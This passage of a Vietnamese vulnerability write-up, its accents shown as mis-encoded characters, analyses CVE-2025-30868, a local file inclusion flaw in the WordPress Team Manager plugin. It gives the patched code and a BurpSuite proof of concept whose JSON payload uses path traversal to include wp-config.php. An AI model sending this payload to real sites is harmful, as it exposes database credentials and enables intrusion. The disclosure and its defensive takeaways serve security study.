ƒë√≥:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$templatePath = public/templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$defaultPath = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$locate_template = locate_template(&#39;public/templates/wp-config.php&#39;) = &amp;quot;&amp;quot;&lt;/code&gt; - &lt;a href=&#34;https://developer.wordpress.org/reference/functions/locate_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;locate_template()&lt;/a&gt; s·∫Ω tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi c·ªßa file n·∫øu t√¨m th·∫•y, ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ chu·ªói r·ªóng &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi &lt;code&gt;$locate_template&lt;/code&gt; r·ªóng th√¨ tr·∫£ v·ªÅ  &lt;code&gt;TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../wp-config.php&#39;&lt;/code&gt; ƒë·ªÉ &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function renderElementorLayout(string $layout, array $data, array $settings): void&#xA;{&#xA;    $allowedLayouts = [&amp;#39;grid&amp;#39;, &amp;#39;list&amp;#39;, &amp;#39;slider&amp;#39;, &amp;#39;table&amp;#39;, &amp;#39;isotope&amp;#39;]; // Allowed layouts&#xA;&#xA;    if (!in_array($layout, $allowedLayouts, true)) {&#xA;        wp_die(__(&amp;#39;Invalid layout.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    $styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;    $styleType = $settings[$styleTypeKey] ?? &amp;#39;&amp;#39;;&#xA;&#xA;    // Ensure only safe characters (alphanumeric &amp;#43; underscores)&#xA;    if (!preg_match(&amp;#39;/^[a-zA-Z0-9_-]&amp;#43;$/&amp;#39;, $styleType)) {&#xA;        wp_die(__(&amp;#39;Invalid style type.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    // Ensure constants exist before using them&#xA;    if (!defined(&amp;#39;TM_PATH&amp;#39;)) {&#xA;        wp_die(__(&amp;#39;TM_PATH is not defined.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    // Define Free path (always available)&#xA;    $basePath = realpath(TM_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39;);&#xA;&#xA;    // Define Pro path if available&#xA;    $proPath = defined(&amp;#39;TM_PRO_PATH&amp;#39;) ? realpath(TM_PRO_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39;) : null;&#xA;&#xA;    // Ensure the free path is valid&#xA;    if (!$basePath) {&#xA;        wp_die(__(&amp;#39;Invalid base template path.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    $templateName = sanitize_file_name($styleType . &amp;#39;.php&amp;#39;);&#xA;&#xA;    // Define possible template paths (Pro first, then Free)&#xA;    $proFullPath = $proPath ? $proPath . &amp;#39;/&amp;#39; . $layout . &amp;#39;/&amp;#39; . $templateName : null;&#xA;    $freeFullPath = $basePath . &amp;#39;/&amp;#39; . $layout . &amp;#39;/&amp;#39; . $templateName;&#xA;&#xA;    // Check if Pro template exists and is readable&#xA;    if ($proFullPath &amp;amp;&amp;amp; is_readable($proFullPath) &amp;amp;&amp;amp; strpos(realpath($proFullPath), $proPath) === 0) {&#xA;        include $proFullPath;&#xA;        return;&#xA;    }&#xA;&#xA;    // Check if Free template exists and is readable&#xA;    if (is_readable($freeFullPath) &amp;amp;&amp;amp; strpos(realpath($freeFullPath), $basePath) === 0) {&#xA;        include $freeFullPath;&#xA;        return;&#xA;    }&#xA;&#xA;    // If neither file is found, show an error&#xA;    wp_die(__(&amp;#39;Template not found or invalid file.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;}&#xA;&#xA;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    // Ensure template name is safe (allow only alphanumeric, dashes, and underscores)&#xA;    if (!preg_match(&amp;#39;/^[a-zA-Z0-9_-]&amp;#43;\.php$/&amp;#39;, $templateName)) {&#xA;        die(&amp;#39;Invalid template name.&amp;#39;);&#xA;    }&#xA;&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;&#xA;    // Ensure paths are properly resolved&#xA;    $resolvedDefaultPath = realpath($defaultPath);&#xA;    $resolvedTemplatePath = realpath(trailingslashit($templatePath));&#xA;&#xA;    // Validate resolved paths&#xA;    if (!$resolvedDefaultPath || strpos($resolvedDefaultPath, realpath(TM_PATH . &amp;#39;/public/templates/&amp;#39;)) !== 0) {&#xA;        die(&amp;#39;Invalid default path.&amp;#39;);&#xA;    }&#xA;&#xA;    if ($resolvedTemplatePath &amp;amp;&amp;amp; strpos($resolvedTemplatePath, realpath(TM_PATH . &amp;#39;/public/templates/&amp;#39;)) === 0) {&#xA;        $template = locate_template($resolvedTemplatePath . &amp;#39;/&amp;#39; . $templateName);&#xA;        if ($template &amp;amp;&amp;amp; file_exists($template)) {&#xA;            return $template;&#xA;        }&#xA;    }&#xA;&#xA;    // Build the final safe path&#xA;    $finalPath = $resolvedDefaultPath . &amp;#39;/&amp;#39; . $templateName;&#xA;&#xA;    // Ensure the final path is within the allowed directory&#xA;    if (file_exists($finalPath) &amp;amp;&amp;amp; strpos(realpath($finalPath), $resolvedDefaultPath) === 0) {&#xA;        return $finalPath;&#xA;    }&#xA;&#xA;    die(&amp;#39;Template not found or invalid.&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ √°p d·ª•ng x√°c th·ª±c ƒë·∫ßu v√†o nghi√™m ng·∫∑t, ki·ªÉm tra ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi, v√† h·∫°n ch·∫ø layout h·ª£p l·ªá, gi√∫p lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng khai th√°c file ngo√†i ph·∫°m vi cho ph√©p =&amp;gt; ngƒÉn &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ch·ªØ &lt;strong&gt;Elementor&lt;/strong&gt; trong t√™n h√†m &lt;code&gt;renderElementorLayout()&lt;/code&gt; li√™n quan ƒë·∫øn plugin &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor plugin&lt;/strong&gt;&lt;/a&gt; trong WordPress, d√πng ƒë·ªÉ t·∫°o n·ªôi dung cho &lt;strong&gt;post&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi g·ª≠i request ch·ªânh s·ª≠a post ch·ª©a &lt;strong&gt;widgets Team Manager&lt;/strong&gt; n√†y ho·∫∑c m·ªü post sau khi l∆∞u th√¨ &lt;code&gt;renderElementorLayout()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/plugin_element.png&#34;&#xA;    alt=&#34;Plugin element trong Elementor&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Plugin element trong Elementor&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;B·∫Øt request ch·ªânh s·ª≠a b·∫±ng BurpSuite:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/setting.png&#34;&#xA;    alt=&#34;Key settings trong request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Key settings trong request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Quan s√°t ta th·∫•y c√≥ key &lt;code&gt;settings&lt;/code&gt; ch·ª©a c√°c key &lt;code&gt;layout_type&lt;/code&gt; v√† &lt;code&gt;{layout_type_value}_stype_type&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi code ta ph√¢n t√≠ch ·ªü tr√™n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;$styleType = stripslashes($settings[$styleTypeKey]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ Ta c√≥ th·ªÉ ki·ªÉm so√°t c√°c gi√° tr·ªã ·ªü ƒë√¢y.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o team m·ªõi t·∫°i endpoint: &lt;code&gt;wp-admin/post-new.php?post_type=team_manager&lt;/code&gt; v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa &lt;strong&gt;widget Team Manager&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o post b·∫±ng &lt;strong&gt;Elementor&lt;/strong&gt;, th√™m &lt;strong&gt;widgets Team Manager&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/widgets.png&#34;&#xA;    alt=&#34;Th√™m Team Manager widget v√†o post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Th√™m Team Manager widget v√†o post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-3&#34;&gt;&lt;span&gt;Step 3&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-3&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Submit&lt;/strong&gt;, b·∫Øt request b·∫±ng &lt;strong&gt;BurpSuite&lt;/strong&gt; g·ª≠i ƒë·∫øn &lt;strong&gt;Repeater&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-4&#34;&gt;&lt;span&gt;Step 4&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-4&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;B√¥i ƒëen gi√° tr·ªã c·ªßa param &lt;code&gt;action&lt;/code&gt;,s·ª≠a payload t·∫°i &lt;strong&gt;tab Inspector&lt;/strong&gt; v√† g·ª≠i l·∫°i request&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;save_builder&amp;#34;: {&#xA;    &amp;#34;action&amp;#34;: &amp;#34;save_builder&amp;#34;,&#xA;    &amp;#34;data&amp;#34;: {&#xA;      &amp;#34;status&amp;#34;: &amp;#34;pending&amp;#34;,&#xA;      &amp;#34;elements&amp;#34;: [&#xA;        {&#xA;          &amp;#34;id&amp;#34;: &amp;#34;e9249f1&amp;#34;,&#xA;          &amp;#34;elType&amp;#34;: &amp;#34;container&amp;#34;,&#xA;          &amp;#34;isInner&amp;#34;: false,&#xA;          &amp;#34;isLocked&amp;#34;: false,&#xA;          &amp;#34;settings&amp;#34;: {},&#xA;          &amp;#34;elements&amp;#34;: [&#xA;            {&#xA;              &amp;#34;id&amp;#34;: &amp;#34;3e7c95b&amp;#34;,&#xA;              &amp;#34;elType&amp;#34;: &amp;#34;widget&amp;#34;,&#xA;              &amp;#34;isInner&amp;#34;: false,&#xA;              &amp;#34;isLocked&amp;#34;: false,&#xA;              &amp;#34;settings&amp;#34;: {&#xA;                &amp;#34;layout_type&amp;#34;: &amp;#34;../../../../../../..&amp;#34;,&#xA;                &amp;#34;../../../../../../.._style_type&amp;#34;: &amp;#34;wp-config&amp;#34;&#xA;              },&#xA;              &amp;#34;elements&amp;#34;: [],&#xA;              &amp;#34;widgetType&amp;#34;: &amp;#34;wtm-team-manager&amp;#34;&#xA;            }&#xA;          ]&#xA;        },&#xA;        {&#xA;          &amp;#34;id&amp;#34;: &amp;#34;b132b28&amp;#34;,&#xA;          &amp;#34;elType&amp;#34;: &amp;#34;container&amp;#34;,&#xA;          &amp;#34;isInner&amp;#34;: false,&#xA;          &amp;#34;isLocked&amp;#34;: false,&#xA;          &amp;#34;settings&amp;#34;: {},&#xA;          &amp;#34;elements&amp;#34;: []&#xA;        }&#xA;      ],&#xA;      &amp;#34;settings&amp;#34;: {&#xA;        &amp;#34;post_title&amp;#34;: &amp;#34;Team&amp;#34;,&#xA;        &amp;#34;post_status&amp;#34;: &amp;#34;pending&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-30868 l√† LFI trong Team Manager ‚â§2.1.23: &lt;code&gt;renderElementorLayout()&lt;/code&gt; kh√¥ng x√°c th·ª±c &lt;code&gt;$layout&lt;/code&gt;/&lt;code&gt;$settings&lt;/code&gt;, cho ph√©p path traversal v√† &lt;code&gt;include()&lt;/code&gt; file ngo√†i √Ω mu·ªën. ƒê√£ v√° trong &lt;strong&gt;v2.2.0&lt;/strong&gt; b·∫±ng whitelist, regex v√† ki·ªÉm tra &lt;code&gt;realpath()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng d√πng input th√¥ ƒë·ªÉ build &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;strong&gt;whitelist&lt;/strong&gt; cho layout/template.&lt;/li&gt;&#xA;&lt;li&gt;Sanitize t√™n file + &lt;code&gt;realpath()&lt;/code&gt; + &lt;code&gt;is_readable()&lt;/code&gt; tr∆∞·ªõc khi include.&lt;/li&gt;&#xA;&lt;li&gt;V·ªõi endpoint public: ki·ªÉm so√°t input server-side, nonce kh√¥ng ƒë·ªß.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-team-manager/vulnerability/wordpress-team-manager-plugin-2-1-23-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; 